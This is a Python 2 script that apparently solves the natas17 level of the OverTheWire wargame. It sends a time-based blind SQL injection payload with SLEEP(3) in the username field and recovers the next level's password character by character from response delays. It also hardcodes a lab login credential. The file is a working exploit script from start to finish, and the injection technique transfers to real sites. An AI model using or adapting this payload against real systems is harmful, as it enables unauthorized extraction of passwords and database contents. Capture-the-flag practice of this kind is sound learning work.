#!/usr/bin/env python

import requests
import re
from string import *

USER = 'natas17'
PASSWORD = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
url = 'http://natas17.natas.labs.overthewire.org/'
caracters = lowercase + uppercase + digits

#r = requests.Session()
#response = r.post(url, data= {"username":'natas18" and hex(password) like "7877%" and SLEEP(5) #'},auth=(USER, PASSWORD))
#print(response.elapsed.total_seconds())


i=0
key=""
decimales=""
while(i<32):
    for l in caracters:
        decimales=hex(ord(l))[2:]
        print "[!] value: " + decimales 
        r = requests.Session()
        #session = r.get('http://natas11.natas.labs.overthewire.org/', auth=(USER, PASSWORD'))
        response = r.post(url, data= {"username":'natas18" and hex(password) like "'+key+decimales+'%" and SLEEP(3) #'},auth=(USER, PASSWORD))

        
        content = re.findall('<pre>\n(.*)\n</pre>',response.text)
        if (response.elapsed.total_seconds()>2):
            key = key + decimales
            print("[+] Letter found, Key: " + str(key.decode("hex")))
            break
    print "[+] Contador: " + str(i)
    i=i+1

print "[+] Key Complete: " + str(key.decode("hex"))
